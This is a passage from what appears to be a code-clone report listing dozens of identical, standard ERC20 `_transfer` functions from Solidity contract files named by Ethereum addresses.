        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x98dBba70df94bC4057a76E29067b5D5D5676f14c.sol" startline="111" endline="123" pcid="5566">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x99818798AedD80Fef824086eF10411C89009e174.sol" startline="109" endline="121" pcid="5581">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xe30a4984a2520ddad1560292df4910f1970da26a.sol" startline="107" endline="119" pcid="8189">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xfE0A4D6A16F934E3d595DB4b0D893071124CB693.sol" startline="106" endline="118" pcid="9298">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x4197014b377FDf6a877ED930f16982045285EF96.sol" startline="112" endline="124" pcid="2425">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x819A8945dC5046816a7061Eb18b248e611c75085.sol" startline="107" endline="119" pcid="4848">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x99D00D99221a9CFF03d0F48a6674b71A7d0893Fc.sol" startline="103" endline="115" pcid="5597">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x14cf1d2a1da97600a7489c87a6d8bb57eb1fbc07.sol" startline="107" endline="119" pcid="599">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x515Eab35fB6F9687e0D6cd8B796aEF5E7d15064F.sol" startline="435" endline="447" pcid="3033">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xBf2A2Cb09E5d0714977A57C3f1e95a8682233099.sol" startline="111" endline="123" pcid="6846">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x11067Cc96F63B2b375fb740FEee95aA2009A5249.sol" startline="112" endline="124" pcid="454">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x91448BdD0ef6810de6E4a8B3Ba82590ab70D5b95.sol" startline="110" endline="122" pcid="5324">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x2fE58503d325203E80Ed379cE24a9AB5b5f56aEa.sol" startline="107" endline="119" pcid="1466">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x4aaFEB9864aad00D9C3e5c278788b343084fdc77.sol" startline="109" endline="121" pcid="2807">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x31dD70842e7443108905d50c216F2CeDb452E80a.sol" startline="111" endline="123" pcid="1569">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xf86c25675cd74be058a798894008ecf6a67dca21.sol" startline="110" endline="122" pcid="9049">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xE29128019902c7B59CEb2A145D7FBFdA58b0ab02.sol" startline="114" endline="126" pcid="8174">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3c44f3b816Dac7abDe925fDBB52448b9aB23f623.sol" startline="107" endline="119" pcid="2116">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xe542Cc82fcd14a249D0Bc3835ef4e3730616b190.sol" startline="113" endline="125" pcid="8295">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x99E6b2939603Ac9F9daF3f441f1A1A05b6d54c1f.sol" startline="109" endline="121" pcid="5615">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x550f95a80e42c5cfBc786C5C47322862e0332528.sol" startline="110" endline="122" pcid="3184">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x492615CB4660943C014ee5950b9375912fF683B8.sol" startline="108" endline="120" pcid="2756">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x9a5d0F32B00BDB418D7667AE36d36eA15FDe594e.sol" startline="109" endline="121" pcid="5635">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xB656d138e4C030064A7aA8d83Aa929928A730c10.sol" startline="111" endline="123" pcid="6649">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x70d8b31f4eeE0E9988D0b196531205A9D30Ad104.sol" startline="111" endline="123" pcid="4161">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x2f6935cc4a043c0bf69165c791ce6f4361278715.sol" startline="111" endline="123" pcid="1451">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xff5c2d7Ea91Cb2a88e58E840f24088B5b445834A.sol" startline="111" endline="123" pcid="9352">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3Bc0F912FcCA2528801E55FcA480F54f69a9c886.sol" startline="112" endline="124" pcid="2056">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3943a56c7b1efd43c3c952aec05cb295f0ab8c67.sol" startline="105" endline="117" pcid="1905">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x033B28BE598a95363830624C0601E58AB03e9922.sol" startline="110" endline="122" pcid="131">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x821d158c454B3a3Fcef1B9f35DBa9cb0e37C5453.sol" startline="110" endline="122" pcid="4863">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x1684f783064B9F4D6273e9ed11F5D753C193E5E5.sol" startline="111" endline="123" pcid="685">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xd0cD86CA2768C13980fE496ca78bC72Ed8f2bE8B.sol" startline="111" endline="123" pcid="7448">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x9adA335674982c21785141cb8bD6B1e0f9ac1FC4.sol" startline="110" endline="122" pcid="5650">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x9bd2cd50d1d2b8fbfc98164672bc02314e3341b4.sol" startline="108" endline="120" pcid="5665">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x1F4275D2806f24d44a0f047C9591141409533f8d.sol" startline="112" endline="124" pcid="996">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x116C9ACc3e70e542b1F2609868Bc4a3000797cb3.sol" startline="111" endline="123" pcid="469">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x9c03094376D96C2b5ffd1B1C5129b048438700CF.sol" startline="106" endline="118" pcid="5680">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x460dad15a49c2738b3fc8cb5c7dcfa5d530847af.sol" startline="111" endline="123" pcid="2632">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x17A5c49Cb48bf49cc10D1Ec05fE899Bb447811Fd.sol" startline="109" endline="121" pcid="721">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x2f324d85C72E2d25bEA80f1aF03392825e15E49a.sol" startline="105" endline="117" pcid="1436">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x9C4595f9D874E2853bc5E57bB98Ca764cBa684d0.sol" startline="112" endline="124" pcid="5695">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x9e765D69c813b6A14835Ff2299aF610561DA2D06.sol" startline="108" endline="120" pcid="5710">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xd80f2392f3592471ef0a0163441db092268c19ee.sol" startline="121" endline="133" pcid="7734">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x47BCDA0202Cf59825388c1Fbc6A03B52dd068121.sol" startline="111" endline="123" pcid="2709">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x46e743046dccf9ab65b8454cdf879187aab5dd49.sol" startline="112" endline="124" pcid="2664">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x249f6849814bfaeda890588e404030eccdefb1c6.sol" startline="108" endline="120" pcid="1137">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x2EE5459A05D2DCF76699D0A383EdAcD6e5A8Ee03.sol" startline="109" endline="121" pcid="1421">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xb07F1e635FbA15234B11A351Ee03Da67D11111B2.sol" startline="112" endline="124" pcid="6507">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xfEf911f4AbE542804fdDFD538E637c827a2c4295.sol" startline="110" endline="122" pcid="9337">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xe10f1b5466b361c9c8c735021A6d00CDea855763.sol" startline="110" endline="122" pcid="8097">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x9ed015445e359b0Dca0A93e34af01d9Dc90D3B26.sol" startline="107" endline="119" pcid="5725">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x9f111397a5A114654A9A6Aa6b3Cd35fbC4500a88.sol" startline="107" endline="119" pcid="5740">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xd5e370D59C687fcB30943607C3E8f9249ee68619.sol" startline="107" endline="119" pcid="7657">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x9f956D811170c17aEeA2382b44132520D7A63701.sol" startline="107" endline="119" pcid="5755">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xe0A9b2Cbd7147f9fb0fE09fAcD2aAB94C0f51444.sol" startline="727" endline="739" pcid="8082">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x2e45211957ECDd650F0eAA42f6D58F03D58159e0.sol" startline="111" endline="123" pcid="1406">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x9FF854892a5FE60995844359FA4BB099915888ef.sol" startline="107" endline="119" pcid="5770">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x46a9D15f23306E44060fb3558CDF051dD9D83FA9.sol" startline="109" endline="121" pcid="2649">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
